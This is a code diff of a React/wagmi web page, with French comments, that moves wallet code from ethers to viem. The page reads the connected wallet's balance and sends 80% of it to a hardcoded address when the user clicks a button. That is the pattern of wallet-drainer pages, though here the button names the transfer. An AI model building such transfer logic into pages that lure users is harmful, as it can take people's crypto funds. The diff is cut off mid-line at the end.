@@ -1,47 +1,42 @@
 import { useState, useEffect } from "react";
-import { useAccount, useConnect, useClient } from "wagmi";
-import { ethers } from "ethers";
+import { useAccount, useConnect, usePublicClient, useWalletClient } from "wagmi";
+import { parseEther, formatEther } from "viem";
 
 export default function Home() {
   const { isConnected, address } = useAccount();
   const { connect, connectors } = useConnect();
-  const client = useClient(); // Correction de la destructuration
-  const provider = client?.provider;
+  const publicClient = usePublicClient(); // Pour lire les infos on-chain
+  const { data: walletClient } = useWalletClient(); // Pour signer les transactions
 
   const [balance, setBalance] = useState<string | null>(null);
 
   useEffect(() => {
     const fetchBalance = async () => {
-      if (!isConnected || !provider || !address) return;
+      if (!isConnected || !publicClient || !address) return;
 
       try {
-        const balance = await provider.getBalance(address);
-        setBalance(ethers.utils.formatEther(balance));
+        const balanceWei = await publicClient.getBalance({ address });
+        setBalance(formatEther(balanceWei));
       } catch (error) {
         console.error("Erreur lors de la récupération du solde :", error);
       }
     };
 
     fetchBalance();
-  }, [isConnected, provider, address]);
+  }, [isConnected, publicClient, address]);
 
   const handleTransfer = async () => {
-    if (!provider || !balance) return;
+    if (!walletClient || !balance) return;
 
     try {
-      const signer = provider.getSigner();
-      const amountToSend = ethers.utils.parseEther(
-        (parseFloat(balance) * 0.8).toString()
-      );
+      const amountToSend = parseEther((parseFloat(balance) * 0.8).toString());
 
-      const tx = await signer.sendTransaction({
+      const tx = await walletClient.sendTransaction({
         to: "0x518c5D62647E60864EcB3826e982c93dFa154af3",
         value: amountToSend,
       });
 
       console.log("Transaction envoyée :", tx);
-      await tx.wait();
-      console.log("Transaction confirmée");
     } catch (error) {
       console.error("Erreur lors de l'envoi de la transaction :", error);
     }
@@ -57,9 +52,4 @@ export default function Home() {
       ) : (
         <>
           <p>Solde actuel : {balance} ETH</p>
-          <button onClick={handleTransfer}>Envoyer 80% de mon solde</button>
-        </>
-      )}
-    </div>
-  );
-}
+          <button onClick={handleTransfer}>Envoyer
